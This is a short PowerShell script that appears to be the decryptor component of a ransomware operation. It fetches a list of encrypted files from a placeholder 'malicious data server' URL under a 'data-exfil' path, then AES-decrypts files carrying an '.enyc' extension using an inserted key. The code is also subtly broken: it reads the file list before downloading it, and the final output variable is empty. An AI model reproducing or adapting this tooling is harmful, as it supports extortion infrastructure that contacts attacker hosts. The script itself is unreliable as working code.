#Gets parameters for AES encryption ready
function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Decrypt-String($key) {
	Invoke-WebRequest -Uri "http://[IP address of malicious data server]/data-exfil/original-list/files-encrypted" -UseBasicParsing -OutFile $env:temp\files-encrypted
    foreach ($item in $list) {
		$bytes = [System.Convert]::FromBase64String([System.IO.File]::ReadAllText($item + '.enyc'))
		$IV = $bytes[0..15]
		$aesManaged = Create-AesManagedObject $key $IV
		$decryptor = $aesManaged.CreateDecryptor();
		$unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
		$aesManaged.Dispose()
		[System.IO.File]::WriteAllBytes($item, $unencryptedData)
	}
}

$key = "[Insert the decryption key here]"
$list = [System.IO.File]::ReadAllLines("$env:temp\files-encrypted")
$backToPlainText = Decrypt-String $key

$backToPlainText